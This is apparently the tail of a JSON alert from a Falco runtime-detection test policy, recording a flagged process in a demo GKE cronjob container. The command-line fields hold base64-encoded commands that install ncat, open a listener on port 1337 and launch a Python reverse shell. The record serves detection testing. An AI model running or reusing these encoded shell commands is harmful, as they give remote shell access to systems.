                                "pcmdline": "bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh",
                                "pid": 4094247,
                                "pid_ts": "2025-04-16T03:01:01.104588229Z",
                                "pname": "bash",
                                "ppid": 4093769,
                                "ppid_ts": "2025-04-16T03:00:00.850031947Z",
                                "sid": "1"
                            },
                            "user": {
                                "name": "root",
                                "uid": "0"
                            }
                        },
                        "origin": "Secure UI",
                        "output": "Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pname=bash gparent=containerd-shim ggparent=<NA> gggparent=<NA> image=docker.io/library/python user.uid=0 proc.cmdline=sh proc.pcmdline=bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMC4wLjAuMCIsMTMzNykpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bihbInNoIiwgIi1jIiwgInNsZWVwIDU7bHMgLWE7IGV4aXQgMCJdKScK | base64 -d | sh user.name=root user.loginuid=-1 proc.args= container.name=shell-scripting evt.type=execve evt.res=SUCCESS proc.pid=4094247 proc.cwd=/ proc.ppid=4093769 proc.sid=1 proc.exepath=/usr/bin/dash user.loginname=<NA> group.gid=0 group.name=root proc.pid.ts=1744772461104588229 proc.ppid.ts=1744772400850031947 proc.hash.sha256=f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6)",
                        "policy_id": "10569534",
                        "rule_name": "My test rule custom",
                        "rule_sub_type": 0,
                        "rule_tags": [
                            "My-tag-custom-1-hello-world",
                            "MITTRE-WHATEVER"
                        ],
                        "rule_type": 6,
                        "type": "workloadRuntimeDetection"
                    },
                    "description": "This is just a dumb policy to test custom policies",
                    "engine": "falco",
                    "id": "1a36a012345678998765432108f1e03e",
                    "labels": {
                        "cloud_provider": {
                            "account": {
                                "id": "012345678912"
                            },
                            "name": "gcp",
                            "region": "us-central1"
                        },
                        "container": {
                            "image": {
                                "digest": "sha256:aa7b73608abcfb021247bbb4c111435234a0459298a6da610681097a54ca2c2a",
                                "id": "ef0f72a55bd2",
                                "repo": "docker.io/library/python",
                                "tag": "3.9.18-slim"
                            },
                            "label": {
                                "io": {
                                    "kubernetes": {
                                        "container": {
                                            "name": "shell-scripting"
                                        },
                                        "pod": {
                                            "name": "shell-scripting-29079540-cqf5n",
                                            "namespace": "default"
                                        }
                                    }
                                }
                            },
                            "name": "shell-scripting"
                        },
                        "gcp": {
                            "location": "us-central1",
                            "project_id": "012345678912"
                        },
                        "host": {
                            "host_name": "gke-cluster-gcp-demo-san-default-pool-12345678-abcd",
                            "mac": "01-00-5E-90-10-00"
                        },
                        "kubernetes": {
                            "cluster": {
                                "name": "gke-alliances-demo-6"
                            },
                            "cron_job": {
                                "name": "shell-scripting"
                            },
                            "job": {
                                "name": "shell-scripting-29079540"
                            },
                            "namespace": {
                                "name": "default"
                            },
                            "node": {
                                "name": "gke-cluster-gcp-demo-san-default-pool-12345678-abcd"
                            },
                            "pod": {
                                "name": "shell-scripting-12345678-abcde"
                            },
                            "workload": {
                                "name": "shell-scripting",
                                "type": "cronjob"
                            }
                        }
                    },
                    "name": "Manuel test policy",
                    "originator": "policy",
                    "raw_event_category": "runtime",
                    "raw_event_originator": "linuxAgent",
                    "severity": 4,
                    "severity_value": "Medium",
                    "source": "syscall",
                    "source_details": {
                        "sub_type": "container",
                        "type": "workload"
                    },
                    "timestamp": "2025-04-16T03:01:01.1951498Z"
                }
            },
            "tags": [
                "preserve_duplicate_custom_fields"
            ],
            "user": {
                "group": {
                    "id": "0",
                    "name": "root"
                },
                "id": "0",
                "name": "root"
            }
        }
    ]
}
